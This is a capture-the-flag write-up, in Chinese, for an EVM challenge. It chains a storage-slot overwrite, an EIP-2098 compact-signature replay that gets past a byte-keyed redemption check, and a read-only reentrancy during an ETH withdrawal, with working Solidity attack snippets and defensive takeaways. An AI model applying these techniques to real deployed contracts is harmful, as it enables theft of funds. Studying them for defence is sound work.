# Re-Remix

## 题目简述

题目部署一组 EVM 合约，要求让 `MusicRemixer.finish()` 计算出的歌曲等级不低于 30。等级由两部分相乘：

```solidity
log2(sampleEditor.region_tempo())
    * complexity(equalizer.getGlobalInfo())
```

其中 `complexity` 是十进制表示中不同数字的数量。正常接口把 tempo 限制在 233，Equalizer 的全局信息也不足以单独达到门槛。完整利用链组合了三处问题：

1. `SampleEditor.updateSettings` 可写任意高位 storage slot；
2. 兑换码按原始字节去重，可用 EIP-2098 紧凑签名重编码同一签名；
3. `Equalizer.decreaseVolume` 在外部转账期间暴露不一致状态，形成 read-only reentrancy。

## 解题过程

### 打开第三段音轨的 Flex

`SampleEditor` 的 storage 布局为：

```text
slot 0: project_tempo
slot 1: region_tempo
slot 2: tracks mapping
```

`adjust()` 只有在 `tracks["Rhythmic"][2].settings.flexOn` 为真时，才把 `project_tempo` 同步到 `region_tempo`。但 `updateSettings` 直接执行：

```solidity
function updateSettings(uint256 p, uint256 v) external {
    if (p <= 39) revert OvO();
    assembly {
        sstore(p, v)
    }
}
```

限制 `p > 39` 对哈希映射槽没有保护作用。`tracks["Rhythmic"]` 的数组长度槽和数据起点分别为：

```solidity
uint arraySlot = uint(
    keccak256(abi.encodePacked("Rhythmic", uint256(2)))
);
uint dataStart = uint(keccak256(abi.encodePacked(arraySlot)));
```

`Region` 占两个槽，第三个元素索引为 2，因此其 `Settings` 位于 `dataStart + 4`。`Align` 枚举占最低字节，`flexOn` 紧随其后；写入 `1 << 8` 即可只打开布尔值：

```solidity
uint slot = uint(
    keccak256(abi.encodePacked("Rhythmic", uint256(2)))
);
slot = uint(keccak256(abi.encodePacked(slot))) + 4;

sampleEditor.updateSettings(slot, 1 << 8);
sampleEditor.setTempo(233);
sampleEditor.adjust();
```

此时 `region_tempo == 233`，等级公式的第一项达到接口允许的最大值。

### 重编码已使用的 ECDSA 签名

构造函数预先把 65 字节签名 `r || s || v` 标记为已兑换，其中 `v = 28`。`getMaterial` 却用整个 `bytes` 作为 mapping key：

```solidity
if (usedRedemptionCode[redemptionCode]) revert CodeRedeemed();
if (ECDSA.recover(hash, redemptionCode) != SIGNER) revert InvalidCode();
usedRedemptionCode[redemptionCode] = true;
```

OpenZeppelin 4.7 同时接受 EIP-2098 的 64 字节紧凑编码 `r || vs`。它把 `v - 27` 写入 `s` 的最高位：

$$
vs = s \mathbin{\vert} ((v-27) \ll 255)
$$

这两种字节串恢复出同一签名者，但 mapping key 不同。因此可以重用构造函数中的 `r`、`s`：

```solidity
bytes32 r =
    hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";
bytes32 vs = bytes32(uint256(r) | (1 << 255));

musicRemixer.getMaterial(abi.encodePacked(r, vs));
```

调用成功后，攻击合约各得到 `1 ether` 的 Instrument 和 Vocal token。

### 在提款中回调 finish

把两种 token 存入 Equalizer：

```solidity
uint[3] memory amounts = [uint(0), 1 ether, 1 ether];

IERC20(equalizer.bands(1)).approve(address(equalizer), 1 ether);
IERC20(equalizer.bands(2)).approve(address(equalizer), 1 ether);

uint variation = equalizer.increaseVolume(amounts);
equalizer.decreaseVolume(variation);
```

`decreaseVolume` 按 band 0、1、2 的顺序更新。处理 band 0 时，它先减少 `gains[0]`，随后通过 `sendValue` 向调用者发送 ETH；此时：

- `gains[0]` 已减少；
- `gains[1]`、`gains[2]` 尚未减少；
- `totalVolumeGain` 尚未执行 `_burn`。

攻击合约的 `receive` 在该瞬间回调：

```solidity
receive() external payable {
    musicRemixer.finish();
}
```

虽然提款函数带有 `nonReentrant`，`finish()` 和只读的 `getGlobalInfo()` 并没有进入同一互斥锁。它们会读取上述暂态不一致的储备，算出具有更多不同十进制数字的全局信息；与 `log2(233)` 相乘后，等级超过 30，触发：

```solidity
event FlagCaptured();
```

启动器以包含该事件的交易哈希验证成功并返回 flag。官方归档没有记录具体 flag 字符串，因此这里保留可复现的成功条件，不臆造结果。

## 方法总结

- 核心技巧：先通过 storage 布局打开 tempo 同步条件，再用紧凑签名绕过去重，最后在 AMM 提款的中间状态中执行只读重入。
- 识别信号：任意 `sstore`、`mapping(bytes => bool)` 对签名原始编码去重、外部转账早于全部状态更新，分别对应 storage corruption、签名表示可塑性和 read-only reentrancy。
- 复用要点：`nonReentrant` 只能阻止受保护函数的重入，不能保证外部回调期间的 view 结果一致；签名去重应绑定消息或规范化后的签名身份，而不是把可变编码字节直接当唯一键。
